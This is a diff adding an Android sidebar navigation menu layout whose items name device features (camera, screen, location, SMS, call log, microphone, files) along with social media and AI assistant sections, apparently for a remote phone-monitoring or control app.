@@ -1,0 +1,148 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Sidebar Navigation Menu (14 features matching desktop) -->
+<menu xmlns:android="http://schemas.android.com/apk/res/android">
+    
+    <group android:checkableBehavior="single">
+        
+        <!-- Camera Feature -->
+        <item
+            android:id="@+id/nav_camera"
+            android:icon="@drawable/ic_camera"
+            android:title="@string/feature_camera" />
+        
+        <!-- Screen Feature -->
+        <item
+            android:id="@+id/nav_screen"
+            android:icon="@drawable/ic_screen"
+            android:title="@string/feature_screen" />
+        
+        <!-- Location Feature -->
+        <item
+            android:id="@+id/nav_location"
+            android:icon="@drawable/ic_location"
+            android:title="@string/feature_location" />
+        
+        <!-- SMS Feature -->
+        <item
+            android:id="@+id/nav_sms"
+            android:icon="@drawable/ic_sms"
+            android:title="@string/feature_sms" />
+        
+        <!-- Call Log Feature -->
+        <item
+            android:id="@+id/nav_calllog"
+            android:icon="@drawable/ic_calllog"
+            android:title="@string/feature_calllog" />
+        
+        <!-- Microphone Feature -->
+        <item
+            android:id="@+id/nav_mic"
+            android:icon="@drawable/ic_mic"
+            android:title="@string/feature_mic" />
+        
+        <!-- Notifications Feature -->
+        <item
+            android:id="@+id/nav_notifications"
+            android:icon="@drawable/ic_notifications"
+            android:title="@string/feature_notifications" />
+        
+        <!-- Chats Feature -->
+        <item
+            android:id="@+id/nav_chats"
+            android:icon="@drawable/ic_chats"
+            android:title="@string/feature_chats" />
+        
+        <!-- Gmail Feature -->
+        <item
+            android:id="@+id/nav_gmail"
+            android:icon="@drawable/ic_gmail"
+            android:title="@string/feature_gmail" />
+        
+        <!-- Files Feature -->
+        <item
+            android:id="@+id/nav_files"
+            android:icon="@drawable/ic_files"
+            android:title="@string/feature_files" />
+        
+        <!-- Digital Wellbeing Feature -->
+        <item
+            android:id="@+id/nav_wellbeing"
+            android:icon="@drawable/ic_wellbeing"
+            android:title="@string/feature_wellbeing" />
+        
+        <!-- App Lock Feature -->
+        <item
+            android:id="@+id/nav_applock"
+            android:icon="@drawable/ic_applock"
+            android:title="@string/feature_applock" />
+        
+        <!-- Wallpaper Feature -->
+        <item
+            android:id="@+id/nav_wallpaper"
+            android:icon="@drawable/ic_wallpaper"
+            android:title="@string/feature_wallpaper" />
+        
+        <!-- Vibrate & Flash Feature -->
+        <item
+            android:id="@+id/nav_vibrateflash"
+            android:icon="@drawable/ic_vibrateflash"
+            android:title="@string/feature_vibrateflash" />
+        
+    </group>
+    
+    <!-- Social Media Group -->
+    <group android:checkableBehavior="single">
+        
+        <item
+            android:id="@+id/nav_whatsapp"
+            android:icon="@drawable/ic_whatsapp"
+            android:title="@string/feature_whatsapp" />
+        
+        <item
+            android:id="@+id/nav_facebook"
+            android:icon="@drawable/ic_facebook"
+            android:title="@string/feature_facebook" />
+        
+        <item
+            android:id="@+id/nav_instagram"
+            android:icon="@drawable/ic_instagram"
+            android:title="@string/feature_instagram" />
+        
+        <item
+            android:id="@+id/nav_messenger"
+            android:icon="@drawable/ic_messenger"
+            android:title="@string/feature_messenger" />
+        
+        <item
+            android:id="@+id/nav_snapchat"
+            android:icon="@drawable/ic_snapchat"
+            android:title="@string/feature_snapchat" />
+        
+        <item
+            android:id="@+id/nav_telegram"
+            android:icon="@drawable/ic_telegram"
+            android:title="@string/feature_telegram" />
+        
+    </group>
+    
+    <!-- AI Assistants Group -->
+    <group android:checkableBehavior="single">
+        
+        <item
+            android:id="@+id/nav_chatgpt"
+            android:icon="@drawable/ic_chatgpt"
+            android:title="@string/feature_chatgpt" />
+        
+        <item
+            android:id="@+id/nav_claude"
+            android:icon="@drawable/ic_claude"
+            android:title="@string/feature_claude" />
+        
+        <item
+            android:id="@+id/nav_grok"
+            android:icon="@drawable/ic_grok"
+            android:title="@string/feature_grok" />
+        
+    </group>
+    
+</menu>
